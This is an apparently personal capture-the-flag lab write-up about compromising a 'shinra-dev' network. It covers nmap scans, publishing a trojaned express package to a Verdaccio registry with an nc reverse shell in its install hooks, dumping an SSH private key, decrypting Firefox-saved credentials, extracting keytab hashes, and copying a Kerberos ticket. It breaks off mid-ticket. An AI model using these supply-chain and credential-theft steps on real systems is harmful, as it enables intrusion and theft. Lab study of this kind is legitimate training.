The initial UDP scan shows the following:

```bash
└─$ nmap -F -sU 172.16.11.11
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-20 14:45 +0100
Nmap scan report for 172.16.11.11
Host is up (0.00027s latency).
All 100 scanned ports on 172.16.11.11 are in ignored states.
Not shown: 100 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 2.39 seconds

```

Where instead the TCP scan shows much more informations:

```bash
PORT     STATE    SERVICE REASON      VERSION
22/tcp   filtered ssh     no-response
3000/tcp filtered ppp     no-response
8220/tcp filtered unknown no-response
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing an open TCP port so results incomplete
Aggressive OS guesses: Sanyo PLC-XU88 digital video projector (95%), Linux 2.6.18 (93%), Buffalo BS-GS switch (92%), Printronix T5304 label printer (92%), Asus WL-500gP wireless broadband router (92%), AXIS 70U Network Document Server (92%), Brother HL-2700CN printer (92%), Brother MFC-7820N printer (92%), IBM 6400 printer (software version 7.0.9.6) (92%), Intel Express 510T, 520T, or 550T switch (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.98%E=4%D=3/20%OT=%CT=%CU=%PV=Y%G=N%TM=69BD50E9%P=x86_64-pc-linux-gnu)
SEQ(CI=I)
T6(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=N%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=N)
IE(R=N)

```

# Back on track

Here the attack is executed from the Registry machine where I noticed that Verdaccio was running, here honestly I had to ask for a nudge and apparently that verdaccio must be used to host a malciious shell in a nodejs code.

I need first to connect my registry to this new one:

```
┌──(user㉿kali-almi)-[~/Downloads/Shinra]
└─$ npm login --registry http://registry.shinra-dev.vl:4873/ --auth-type=legacy
npm notice Log in on http://registry.shinra-dev.vl:4873/
Username: verdaccio
Password: 
Logged in on http://registry.shinra-dev.vl:4873/.
```

I might first try to use this as repository:

```
https://github.com/ZeltNamizake/drevshell
```

But it fails to upload?

```
└─$ npm publish --registry http://registry.shinra-dev.vl:4873/ --auth-type=legacy

npm notice 
npm notice 📦  ReverseShell@1.0.0
npm notice === Tarball Contents === 
npm notice 1.1kB  LICENSE       
npm notice 745B   README.md     
npm notice 351B   client.js     
npm notice 291B   package.json  
npm notice 72.2kB screenshot.png
npm notice === Tarball Details === 
npm notice name:          ReverseShell                            
npm notice version:       1.0.0                                   
npm notice filename:      ReverseShell-1.0.0.tgz                  
npm notice package size:  73.3 kB                                 
npm notice unpacked size: 74.7 kB                                 
npm notice shasum:        f2af9c434499dce886038428c1dd0c483d98b212
npm notice integrity:     sha512-tSZfXaXEfXcOy[...]AjqfvS6ELbhcw==
npm notice total files:   5                                       
npm notice 
npm notice Publishing to http://registry.shinra-dev.vl:4873/ with tag latest and default access


npm ERR! code E503
npm ERR! 503 Service Unavailable - PUT http://registry.shinra-dev.vl:4873/ReverseShell - one of the uplinks is down, refuse to publish

npm ERR! A complete log of this run can be found in:
npm ERR!     /home/user/.npm/_logs/2026-03-24T14_27_28_076Z-debug-0.log
```

Now I was thinking I need to edit the current module as if I plant a new one the RCE will not be invoked untill someone executes it and since it is a CTF I rather need to edit the current one so checking the repository seems like the storage is under var table:

```
rw-r--r-- 1 verdaccio verdaccio 321 Dec 18  2022 /etc/verdaccio/config.yaml
root@registry:~/verdaccio/storage# cat /etc/verdaccio/config.yaml
storage: /var/lib/verdaccio/storage
auth:
  htpasswd:
    file: /var/lib/verdaccio/htpasswd
    max_users: -1
uplinks:
  npmjs:
    url: https://registry.npmjs.org/
packages:
  "**":
    access: $all
    publish: $authenticated
    proxy: npmjs
listen:
  - 0.0.0.0:4873
log: { type: stdout, format: pretty, level: http }
root@registry:~/verdaccio/storage#
```

And here is where is installed:

```
}root@registry:/var/lib/verdaccio/storage/express# ll
total 980
drwxr-xr-x  2 verdaccio verdaccio   4096 Jan  2  2023 ./
drwxrwxr-x 88 verdaccio verdaccio   4096 Dec 26  2022 ../
-rw-r--r--  1 verdaccio verdaccio  55804 Mar 24 14:30 express-4.18.3.tgz
-rw-r--r--  1 verdaccio verdaccio 934592 Mar 24 14:30 package.json
root@registry:/var/lib/verdaccio/storage/express# pp
```

Now here I was lost because the AI has hallucinating but the idea is (as I got tipsed) to dowload the actual file from the web repository:  
![209ed79b5ab272c78f602cc9ea423de5.png](../../../_resources/209ed79b5ab272c78f602cc9ea423de5.png)

Now that I have downloaded the file I can edit the content:

![fb32c3dd53b688337450a3112881eb98.png](../../../_resources/fb32c3dd53b688337450a3112881eb98.png)

Ai suggest first to edit the version of the package otherwise it will not be possible to push back the settings:

![d4c2a8f144859e3001d187dfe34dcffe.png](../../../_resources/d4c2a8f144859e3001d187dfe34dcffe.png)

Next i need to plant a revshell that points back to the WEB01(i want to play safe as I am not sure which is the victim OS, I guess Linux and I am not sure the victim will be able to fetch back a shell back to me!

Now, this part is where I need to inject the bash command:

```json
  "scripts": {
    "lint": "eslint .",
    "test": "mocha --require test/support/env --reporter spec --bail --check-leaks test/ test/acceptance/",
    "test-ci": "nyc --reporter=lcovonly --reporter=text npm test",
    "test-cov": "nyc --reporter=html --reporter=text npm test",
    "test-tap": "mocha --require test/support/env --reporter tap --check-leaks test/ test/acceptance/"
  }
}
```

So I am trying first this one:

```json
  "files": [
    "LICENSE",
    "History.md",
    "Readme.md",
    "index.js",
    "lib/"
  ],
  "scripts": {
    "preinstall": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 172.16.11.20 4444 >/tmp/f",
    "lint": "eslint .",
    "test": "mocha --require test/support/env --reporter spec --bail --check-leaks test/ test/acceptance/",
    "test-ci": "nyc --reporter=lcovonly --reporter=text npm test",
    "test-cov": "nyc --reporter=html --reporter=text npm test",
    "test-tap": "mocha --require test/support/env --reporter tap --check-leaks test/ test/acceptance/"
  }
}
```

And now I can publish the change:

```
└─$ npm publish --registry http://registry.shinra-dev.vl:4873/ --auth-type=legacy

npm notice 
npm notice 📦  express@6.6.6
npm notice === Tarball Contents === 
npm notice 113.1kB History.md             
npm notice 1.2kB   LICENSE                
npm notice 5.4kB   Readme.md              
npm notice 224B    index.js               
npm notice 14.6kB  lib/application.js     
npm notice 2.4kB   lib/express.js         
npm notice 853B    lib/middleware/init.js 
npm notice 885B    lib/middleware/query.js
npm notice 12.5kB  lib/request.js         
npm notice 28.0kB  lib/response.js        
npm notice 15.1kB  lib/router/index.js    
npm notice 3.3kB   lib/router/layer.js    
npm notice 4.3kB   lib/router/route.js    
npm notice 6.0kB   lib/utils.js           
npm notice 3.3kB   lib/view.js            
npm notice 2.7kB   package.json           
npm notice === Tarball Details === 
npm notice name:          express                                 
npm notice version:       6.6.6                                   
npm notice filename:      express-6.6.6.tgz                       
npm notice package size:  55.9 kB                                 
npm notice unpacked size: 214.0 kB                                
npm notice shasum:        705e1bf65c16cd9d47a1dabc9d2b8145c93cfb26
npm notice integrity:     sha512-FTV2sVRoPK/C9[...]Hdm9eAqRJY/Jw==
npm notice total files:   16                                      
npm notice 
npm notice Publishing to http://registry.shinra-dev.vl:4873/ with tag latest and default access
+ express@6.6.6
```

I can see the changes reflected on the backend:

![c2f133d0b1d4b3328f7b2651b874dfa9.png](../../../_resources/c2f133d0b1d4b3328f7b2651b874dfa9.png)

Now for some reasons it is not invoking anything so I asked AI and seems like there is another "hook" that is executed post installation.

![8347f04d46ea2e7b49e65864dc126b14.png](../../../_resources/8347f04d46ea2e7b49e65864dc126b14.png)

So now I am trying again this one:

```json
  "scripts": {
    "postinstall": "bash -c 'ping -c 3 172.16.11.20'",
    "lint": "eslint .",
    "test": "mocha --require test/support/env --reporter spec --bail --check-leaks test/ test/acceptance/",
    "test-ci": "nyc --reporter=lcovonly --reporter=text npm test",
    "test-cov": "nyc --reporter=html --reporter=text npm test",
    "test-tap": "mocha --require test/support/env --reporter tap --check-leaks test/ test/acceptance/"
  }
}

```

And after 5 minutes I see a callback:

```bash
root@web01:/tmp# tcpdump -i  eth1 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), snapshot length 262144 bytes
09:14:17.802175 IP 172.16.11.11 > web01: ICMP echo request, id 1, seq 1, length 64
09:14:17.802259 IP web01 > 172.16.11.11: ICMP echo reply, id 1, seq 1, length 64
09:14:18.823315 IP 172.16.11.11 > web01: ICMP echo request, id 1, seq 2, length 64
09:14:18.823353 IP web01 > 172.16.11.11: ICMP echo reply, id 1, seq 2, length 64
09:14:19.847139 IP 172.16.11.11 > web01: ICMP echo request, id 1, seq 3, length 64
09:14:19.847170 IP web01 > 172.16.11.11: ICMP echo reply, id 1, seq 3, length 64

```

Now it is a pure case that this worked as the TTL is 64 and I specifically used bash then I know the base is correct. I am trying this one now, and hopeully both the revshell will be executed but also I used the & at the end to tell it to execute in background even if the process would fail.

```json
  "scripts": {
    "postinstall": "bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 172.16.11.20 4444 >/tmp/f' &",
    "lint": "eslint .",
    "test": "mocha --require test/support/env --reporter spec --bail --check-leaks test/ test/acceptance/",
    "test-ci": "nyc --reporter=lcovonly --reporter=text npm test",
    "test-cov": "nyc --reporter=html --reporter=text npm test",
    "test-tap": "mocha --require test/support/env --reporter tap --check-leaks test/ test/acceptance/"
  }
}

```

Now I have a shell:  
![0332ad91c45c35675b464cdaaf0f8152.png](../../../_resources/0332ad91c45c35675b464cdaaf0f8152.png)

# Road to Root

Now It is time to look around and i see the private key for this machine?

```bash
d_ed25519.pub
carol.mason@shinra-dev.vl@client02:~/.ssh$ cat id_ed25519
cat id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBYmYtUZdaeU1gr1E6M4PQbLrcQyQZTXb+G3isPsC+WuAAAAJB6ufnvern5
7wAAAAtzc2gtZWQyNTUxOQAAACBYmYtUZdaeU1gr1E6M4PQbLrcQyQZTXb+G3isPsC+WuA
AAAEAExLzjs3DnSt4C3eSGr5o6/suIbgZ4uun43gNvqKQP1ViZi1Rl1p5TWCvUTozg9Bsu
txDJBlNdv4beKw+wL5a4AAAACHJvb3Qga2V5AQIDBAU=
-----END OPENSSH PRIVATE KEY-----
carol.mason@shinra-dev.vl@client02:~/.ssh$ cat id_ed25519.pub
cat id_ed25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFiZi1Rl1p5TWCvUTozg9BsutxDJBlNdv4beKw+wL5a4 root key
carol.mason@shinra-dev.vl@client02:~/.ssh$ 


```

With these credentials I am root on the machine:

```bash
└─$ ssh -i id_client02.key root@172.16.11.11
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-56-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

13 updates can be applied immediately.
11 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Jan  8 08:28:24 2023 from 172.16.11.20
root@client02:~# ls
flag.txt  snap
root@client02:~# cat flag.txt 
SHINRA{a6bed23596b6f85d0b504522316847c8}
root@client02:~# 


```

Now even if iI am already root I need to start to scaveng for stuff otherwise I can't move forward, for this reason I uploaded and executed Linpeas as Carol(otherwise root would create too-much noise)

```bash
╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /home/carol.mason@shinra-dev.vl/.cache/tracker3/files/http%3A%2F%2Ftracker.api.gnome.org%2Fontology%2Fv3%2Ftracker%23Audio.db: SQLite 3.x database, last written using SQLite version 3037002, writer version 2, read version 2, file counter 2, database pages 316, cookie 0x12a, schema 4, UTF-8, version-valid-for 2
Found /home/carol.mason@shinra-dev.vl/.cache/tracker3/files/http%3A%2F%2Ftracker.api.gnome.org%2Fontology%2Fv3%2Ftracker%23Documents.db: SQLite 3.x database, last written using SQLite version 3037002, writer version 2, read version 2, file counter 2, database pages 316, cookie 0x12a, schema 4, UTF-8, version-valid-for 2
Found /home/carol.mason@shinra-dev.vl/.cache/tracker3/files/http%3A%2F%2Ftracker.api.gnome.org%2Fontology%2Fv3%2Ftracker%23FileSystem.db: SQLite 3.x database, last written using SQLite version 3037002, writer version 2, read version 2, file counter 5, database pages 345, 1st free page 345, free pages 1, cookie 0x12a, schema 4, UTF-8, version-valid-for 5
Found /home/carol.mason@shinra-dev.vl/.cache/tracker3/files/http%3A%2F%2Ftracker.api.gnome.org%2Fontology%2Fv3%2Ftracker%23Pictures.db: SQLite 3.x database, last written using SQLite version 3037002, writer version 2, read version 2, file counter 2, database pages 316, cookie 0x12a, schema 4, UTF-8, version-valid-for 2
Found /home/carol.mason@shinra-dev.vl/.cache/tracker3/files/http%3A%2F%2Ftracker.api.gnome.org%2Fontology%2Fv3%2Ftracker%23Software.db: SQLite 3.x database, last written using SQLite version 3037002, writer version 2, read version 2, file counter 3, database pages 368, cookie 0x12a, schema 4, UTF-8, version-valid-for 3
Found /home/carol.mason@shinra-dev.vl/.cache/tracker3/files/http%3A%2F%2Ftracker.api.gnome.org%2Fontology%2Fv3%2Ftracker%23Video.db: SQLite 3.x database, last written using SQLite version 3037002, writer version 2, read version 2, file counter 2, database pages 316, cookie 0x12a, schema 4, UTF-8, version-valid-for 2
Found /home/carol.mason@shinra-dev.vl/.cache/tracker3/files/meta.db: SQLite 3.x database, user version 26, last written using SQLite version 3037002, page size 8192, writer version 2, read version 2, file counter 2, database pages 345, cookie 0x12d, schema 4, UTF-8, version-valid-for 2
Found /home/carol.mason@shinra-dev.vl/.local/share/evolution/addressbook/system/contacts.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 4, database pages 21, cookie 0x11, schema 4, UTF-8, version-valid-for 4
Found /home/carol.mason@shinra-dev.vl/.local/share/nautilus/tags/meta.db: SQLite 3.x database, user version 26, last written using SQLite version 3037002, page size 8192, writer version 2, read version 2, file counter 2, database pages 37, cookie 0x22, schema 4, UTF-8, version-valid-for 2
Found /home/carol.mason@shinra-dev.vl/snap/firefox/common/.mozilla/firefox/qtsma03t.default/cert9.db: SQLite 3.x database, last written using SQLite version 3038003, page size 32768, file counter 8, database pages 7, cookie 0x5, schema 4, UTF-8, version-valid-for 8
Found /home/carol.mason@shinra-dev.vl/snap/firefox/common/.mozilla/firefox/qtsma03t.default/content-prefs.sqlite: SQLite 3.x database, user version 4, last written using SQLite version 3038003, page size 32768, file counter 1, database pages 7, cookie 0x6, schema 4, UTF-8, version-valid-for 1
Found /home/carol.mason@shinra-dev.vl/snap/firefox/common/.mozilla/firefox/qtsma03t.default/cookies.sqlite: SQLite 3.x database, user version 12, last written using SQLite version 3038003, page size 32768, writer version 2, read version 2, file counter 3, database pages 3, cookie 0x1, schema 4, UTF-8, version-valid-for 3
Found /home/carol.mason@shinra-dev.vl/snap/firefox/common/.mozilla/firefox/qtsma03t.default/favicons.sqlite: SQLite 3.x database, last written using SQLite version 3038003, page size 32768, writer version 2, read version 2, file counter 4, database pages 8, cookie 0x6, schema 4, largest root page 8, UTF-8, vacuum mode 1, version-valid-for 4
Found /home/carol.mason@shinra-dev.vl/snap/firefox/common/.mozilla/firefox/qtsma03t.default/formhistory.sqlite: SQLite 3.x database, user version 5, last written using SQLite version 3038003, page size 32768, file counter 3, database pages 8, cookie 0x7, schema 4, UTF-8, version-valid-for 3
Found /home/carol.mason@shinra-dev.vl/snap/firefox/common/.mozilla/firefox/qtsma03t.default/key4.db: SQLite 3.x database, last written using SQLite version 3038003, page size 32768, file counter 4, database pages 9, cookie 0x6, schema 4, UTF-8, version-valid-for 4
Found /home/carol.mason@shinra-dev.vl/snap/firefox/common/.mozilla/firefox/qtsma03t.default/permissions.sqlite: SQLite 3.x database, user version 12, last written using SQLite version 3038003, page size 32768, file counter 6, database pages 3, cookie 0x2, schema 4, UTF-8, version-valid-for 6
Found /home/carol.mason@shinra-dev.vl/snap/firefox/common/.mozilla/firefox/qtsma03t.default/places.sqlite: SQLite 3.x database, user version 69, last written using SQLite version 3038003, page size 32768, writer version 2, read version 2, file counter 3, database pages 52, cookie 0x2b, schema 4, UTF-8, version-valid-for 3
Found /home/carol.mason@shinra-dev.vl/snap/firefox/common/.mozilla/firefox/qtsma03t.default/protections.sqlite: SQLite 3.x database, user version 1, last written using SQLite version 3038003, page size 32768, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 2
Found /home/carol.mason@shinra-dev.vl/snap/firefox/common/.mozilla/firefox/qtsma03t.default/storage/ls-archive.sqlite: SQLite 3.x database, user version 2, last written using SQLite version 3038003, page size 32768, file counter 4, database pages 4, cookie 0x3, schema 4, UTF-8, version-valid-for 4
Found /home/carol.mason@shinra-dev.vl/snap/firefox/common/.mozilla/firefox/qtsma03t.default/storage/permanent/chrome/idb/1451318868ntouromlalnodry--epcr.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3038003, writer version 2, read version 2, file counter 3, database pages 11, cookie 0xd, schema 4, largest root page 11, UTF-8, vacuum mode 1, version-valid-for 3
Found /home/carol.mason@shinra-dev.vl/snap/firefox/common/.mozilla/firefox/qtsma03t.default/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3038003, writer version 2, read version 2, file counter 3, database pages 11, cookie 0xd, schema 4, largest root page 11, UTF-8, vacuum mode 1, version-valid-for 3
Found /home/carol.mason@shinra-dev.vl/snap/firefox/common/.mozilla/firefox/qtsma03t.default/storage/permanent/chrome/idb/2823318777ntouromlalnodry--naod.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3038003, writer version 2, read version 2, file counter 3, database pages 11, cookie 0xd, schema 4, largest root page 11, UTF-8, vacuum mode 1, version-valid-for 3
Found /home/carol.mason@shinra-dev.vl/snap/firefox/common/.mozilla/firefox/qtsma03t.default/storage/permanent/chrome/idb/2918063365piupsah.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3038003, writer version 2, read version 2, file counter 3, database pages 11, cookie 0xd, schema 4, largest root page 11, UTF-8, vacuum mode 1, version-valid-for 3
Found /home/carol.mason@shinra-dev.vl/snap/firefox/common/.mozilla/firefox/qtsma03t.default/storage/permanent/chrome/idb/3561288849sdhlie.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3038003, writer version 2, read version 2, file counter 3, database pages 11, cookie 0xd, schema 4, largest root page 11, UTF-8, vacuum mode 1, version-valid-for 3
Found /home/carol.mason@shinra-dev.vl/snap/firefox/common/.mozilla/firefox/qtsma03t.default/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite: SQLite 3.x database, user version 416, last written using SQLite version 3038003, writer version 2, read version 2, file counter 22, database pages 2228, cookie 0xd, schema 4, largest root page 11, UTF-8, vacuum mode 1, version-valid-for 22
Found /home/carol.mason@shinra-dev.vl/snap/firefox/common/.mozilla/firefox/qtsma03t.default/storage.sqlite: SQLite 3.x database, user version 131075, last written using SQLite version 3038003, page size 512, file counter 5, database pages 8, cookie 0x4, schema 4, UTF-8, version-valid-for 5
Found /home/carol.mason@shinra-dev.vl/snap/firefox/common/.mozilla/firefox/qtsma03t.default/webappsstore.sqlite: SQLite 3.x database, user version 2, last written using SQLite version 3038003, page size 32768, writer version 2, read version 2, file counter 2, database pages 3, cookie 0x2, schema 4, UTF-8, version-valid-for 2
Found /var/lib/colord/mapping.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 3, database pages 4, cookie 0x2, schema 4, UTF-8, version-valid-for 3
Found /var/lib/colord/storage.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 3, database pages 7, cookie 0x3, schema 4, UTF-8, version-valid-for 3
Found /var/lib/command-not-found/commands.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 5, database pages 842, cookie 0x4, schema 4, UTF-8, version-valid-for 5
Found /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 5, database pages 10, cookie 0x5, schema 4, UTF-8, version-valid-for 5
Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 11, database pages 8, cookie 0x4, schema 4, UTF-8, version-valid-for 11


```

I see some firefox data?

```bash
-> Extracting tables from /home/carol.mason@shinra-dev.vl/snap/firefox/common/.mozilla/firefox/qtsma03t.default/places.sqlite (limit 20)
  --> Found interesting column names in moz_places (output limit 10)
CREATE TABLE moz_places (   id INTEGER PRIMARY KEY, url LONGVARCHAR, title LONGVARCHAR, rev_host LONGVARCHAR, visit_count INTEGER DEFAULT 0, hidden INTEGER DEFAULT 0 NOT NULL, typed INTEGER DEFAULT 0 NOT NULL, frecency INTEGER DEFAULT -1 NOT NULL, last_visit_date INTEGER , guid TEXT, foreign_count INTEGER DEFAULT 0 NOT NULL, url_hash INTEGER DEFAULT 0 NOT NULL , description TEXT, preview_image_url TEXT, site_name TEXT, origin_id INTEGER REFERENCES moz_origins(id))
1, https://www.mozilla.org/privacy/firefox/, None, gro.allizom.www., 1, 1, 0, 25, 1671376980753615, jcQxfal9LbjZ, 0, 47356411089529, None, None, None, 1

  --> Found interesting column names in moz_previews_tombstones (output limit 10)
CREATE TABLE moz_previews_tombstones (   hash TEXT PRIMARY KEY ) WITHOUT ROWID

 -> Extracting tables from /home/carol.mason@shinra-dev.vl/snap/firefox/common/.mozilla/firefox/qtsma03t.default/protections.sqlite (limit 20)
 -> Extracting tables from /home/carol.mason@shinra-dev.vl/snap/firefox/common/.mozilla/firefox/qtsma03t.default/storage/ls-archive.sqlite (limit 20)
 -> Extracting tables from /home/carol.mason@shinra-dev.vl/snap/firefox/common/.mozilla/firefox/qtsma03t.default/storage/permanent/chrome/idb/1451318868ntouromlalnodry--epcr.sqlite (limit 20)
 -> Extracting tables from /home/carol.mason@shinra-dev.vl/snap/firefox/common/.mozilla/firefox/qtsma03t.default/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.sqlite (limit 20)
 -> Extracting tables from /home/carol.mason@shinra-dev.vl/snap/firefox/common/.mozilla/firefox/qtsma03t.default/storage/permanent/chrome/idb/2823318777ntouromlalnodry--naod.sqlite (limit 20)
 -> Extracting tables from /home/carol.mason@shinra-dev.vl/snap/firefox/common/.mozilla/firefox/qtsma03t.default/storage/permanent/chrome/idb/2918063365piupsah.sqlite (limit 20)
 -> Extracting tables from /home/carol.mason@shinra-dev.vl/snap/firefox/common/.mozilla/firefox/qtsma03t.default/storage/permanent/chrome/idb/3561288849sdhlie.sqlite (limit 20)
 -> Extracting tables from /home/carol.mason@shinra-dev.vl/snap/firefox/common/.mozilla/firefox/qtsma03t.default/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite (limit 20)
 -> Extracting tables from /home/carol.mason@shinra-dev.vl/snap/firefox/common/.mozilla/firefox/qtsma03t.default/storage.sqlite (limit 20)
 -> Extracting tables from /home/carol.mason@shinra-dev.vl/snap/firefox/common/.mozilla/firefox/qtsma03t.default/webappsstore.sqlite (limit 20)
 -> Extracting tables from /var/lib/colord/mapping.db (limit 20)
 -> Extracting tables from /var/lib/colord/storage.db (limit 20)
 -> Extracting tables from /var/lib/command-not-found/commands.db (limit 20)
 -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)
 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)

```

And I see some Gmail creds, might be some

```bash
/firefox/common/.mozilla/firefox/qtsma03t.default$ cat logins.json
cat logins.json
{"nextId":2,"logins":[{"id":1,"hostname":"https://gmail.com","httpRealm":null,"formSubmitURL":"","usernameField":"","passwordField":"","encryptedUsername":"MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECFav6oXiQvkDBBg08haxIt4VBf5bjDe2qQTyCsDgBhuyIe4=","encryptedPassword":"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECCUL2u4FCPozBBBhnOAEzl5gsfUmvybxuZUE","guid":"{7f0b6fc0-3da4-48d0-8c85-08334ad670fa}","encType":1,"timeCreated":1671377125105,"timeLastUsed":1671377125105,"timePasswordChanged":1671377125105,"timesUsed":1}],"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}</firefox/common/.mozilla/firefox/qtsma03t.default$ 

```

Now I had to copy the whole folder locally but eveutally I have some credentials in cleartext and I am hoping for some password resuse in ad?

```bash
└─$ python3 ../Tools/firefox_decrypt/firefox_decrypt.py firefox

Website:   https://gmail.com
Username: 'c.mason@gmail.com'
Password: 'LTDfQag7qiU2023'

```

I can export the machine hash of the domain object:

```bash
└─$ python3 ../Tools/KeyTabExtract/keytabextract.py krb5_client02.keytab 
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
    REALM : SHINRA-DEV.VL
    SERVICE PRINCIPAL : CLIENT02$/
    NTLM HASH : 6457395ca00ab766a1fe6a546fe93279
    AES-256 HASH : 1c9db513aea0d537d39cedd35861a35ec7340848ac4190e79b9f63e6263899a0
    AES-128 HASH : 29337fabf844b46a54e53efed7c7ab47

```

Now unfortunately none of these password works anywhere so here I had to ask for a tips and the idea is to try to export this ticket for the user Conor.Brown.

```bash
root@client02:/tmp# cat krb5cc_1492401139_1AcPLm
SHINRA-DEV.VL
SHINRA-DEV.VLConor.Brown
HINRA-DEV.VL���0������y�ue�c�c.{؋��j�m���4R��cF���|U�c��-&��y�H2S���v���a��4=4婠�,Sd�OI����#*Y'����qec�V�8��Ў������_����-��~��ɉ���=HP���8�{�d��#6l~�XKNY�vn`DK'J� �ڡ��hm�1��Qc�=��ĺi6."^�~���ӊ�$�E4\���I��{�$�̼J�'�~q�cQ�e�P^q� +Rh�낾LC�U����'h�?��%�eX�␦�Ia!�Km+*���u�3L���>��i��_8��Y��A��i␦Awֱ��(�[����~B�Dj	���
        �'��8ǘ�@��*��0�8c��LW���tlT/��s�j}�c��zJ�˖J��ڸ����/���fFxsi:����{�3ċP玬����>r~����%;�w�66k7��w��
m�)Kj"�b�=��ߟg�:7]D��(Z�,��G�O5���x�z���zV�M�-�:���rԙ�����$;ߖ�߾                                         ��̴�Ɒ̦�p^J󁱇!�OD�������*���������=g�|,���)��UZ�D���bƚ����
��"�i��BD���0>xJ����]x�ձT��Œ﷕�h�G�ii�7^�E�H��Q�="��>[�M��Q�CPb�
                                        �E�_=���B�I����wP�:P��.�G�n�Z��@�\l���Li3pۃv���]Ej~ ��8қ
>��Y��c|�q�[��  �.3��Pݓ�1_>�                                                                    m 
�|�
no:ܬT�
      ��;�F�����:�����>�D@�:@�
                              g��O���ߦ�x?bd�srBa����GO
��P'�(�P�,�Pk����}͠��v␦��o^S������9ܼ⬻��1^ù��
                                          ���Z�o��\m';���h8��7�b9�p
                                                                   �\L�̜�1�՗��
��
�
&root@client02:/tmp# 

```

And now I should be able to surf around?

```bash
└─$ echo "BQQAAAAAAAEAAAABAAAADVNISU5SQS1ERVYuVkwAAAALQ29ub3IuQnJvd24AAAABAAAAAQAAAA1TSElOUkEtREVWLlZMAAAAC0Nvbm9yLkJyb3duAAAAAgAAAAIAAAANU0hJTlJBLURFVi5WTAAAAAZrcmJ0Z3QAAAANU0hJTlJBLURFVi5WTAASAAAAIAf6kVVSxEKA7A08yw0jxUi75TnydYzUvjEsKtRQRn/hacNhFmnDYRZpw+22acYEFgAA4QAAAAAAAAAAAAAAAATRYYIEzTCCBMmgAwIBBaEPGw1TSElOUkEtREVWLlZMoiIwIKADAgECoRkwFxsGa3JidGd0Gw1TSElOUkEtREVWLlZMo4IEizCCBIegAwIBEqEDAgECooIEeQSCBHVlt2ONYy572IvexX9qj22elpc0UpPGY0YTlwD6/BvJfB9Vs2O43i0mkrx54UgyU4jgxHbi5offFmHmwzQ9NOWpoLcfLFNk9E9J2xn7mQDMIypZG6Yn79kY/ZADcWVjrVbmOPnwudCO0vuWwLEe7V/XE7nb85oUQAgt28t+loHJiRf5muY9SFAGgcC6OJl7omT1riM2bH4X71hLTln1FhZ2Am5gREsnxxuCoD9sboMH3ba33HidpnawpMu1WEjuH1Yvj8qpqmmWsYf1ivX56Q1Wfhdb3BAxTHnpnG3zMdQCw1EW/Qhj44w9mcPEuhhpNi4iXrl+i7+A04q7JMpFNBHQmwhc3N3iSeb5e/AkjMy8Svcn/H5xkB9jUbRlo+6nulBeccsgK1JoB67rgr5MQ8MPVd0ZgMcTpCdo8j/f1yXPZViDGtBJYSHoS20rKvTK/gMWAXUdvDNMnB60yT7b2WnAxV84g4dZ9dh/QZmyaRpBd9ax9qco1luWxN3NfkKcRGoJvK/pDUrPIAG/2qHLxmgLtSecmgQ4x5i8QAfPyyr70TDAOGMBwtwDTFe5BvzSdGxUL+zac4NqfemjYxeB2HpK3cuWSrvv2rixgoqzL9ba8GZGeHNpOqv58q/ke58zFcSLUOeOrK0c8InyPnJ+zQ+HpYMlO80Qd/c2Nms3kax3lBXrC7elzLSkA+KxsMym43BeSvOBsYch7k9Ek4qsvq7ol8sqjubK3AOn/5Px4T1nnXwsrY/luAYp3ONVWuSxRPPf/GLGmr/+pOgN+OmS3VjuSNvCouwJJt2mtuHv/pAAjSqUTLWsixADnOtTPZTHEF+bzVGi+K